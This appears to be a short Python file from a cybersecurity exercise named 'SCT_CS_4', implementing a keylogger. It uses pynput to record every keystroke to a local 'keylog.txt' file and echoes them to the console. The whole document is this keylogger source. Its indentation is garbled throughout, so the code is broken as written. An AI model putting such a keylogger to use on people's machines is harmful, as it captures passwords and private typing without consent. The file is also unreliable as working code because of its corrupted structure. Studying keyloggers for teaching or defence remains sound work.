# SCT_CS_4
    from pynput.keyboard import Listener  # Import the Listener from pynput to capture keystrokes
    import os  # Import os module for file handling

# === LOG FILE CONFIGURATION ===
    LOG_FILE = "keylog.txt"  # File where keystrokes will be stored
    def log_key(key):
"""
    Function to log keystrokes into a file.
    
   Parameters:
    - key: The key that was pressed.
    """
    try:
      # Get the character for normal keys (letters, numbers, symbols)
      
              key = key.char  
# Convert special keys (Shift, Enter, etc.) to string
    except AttributeError:
            key = str(key) 
    
  # Append the captured key to the log file
     with open(LOG_FILE, "a") as file:
        file.write(key + " ")  # Save the keypress with spacing for readability
    
  # Print the key to the console in real-time
    print(key, end=" ", flush=True)

    def main():
    """
    Main function to initialize and start the keylogger.
    """
    print("[+] Keylogger Started. Press Ctrl+C to stop.")  # Notify user that the keylogger has started
    
   # Start listening for keystrokes
    with Listener(on_press=log_key) as listener:
        try:
            listener.join()  # Keep the listener running
        except KeyboardInterrupt:
            print("\n[+] Keylogger Stopped.")  # Notify user that logging has stopped
            listener.stop()  # Stop the listener

# === RUN THE PROGRAM ===
    if __name__ == "__main__":
    main()  # Start the keylogger
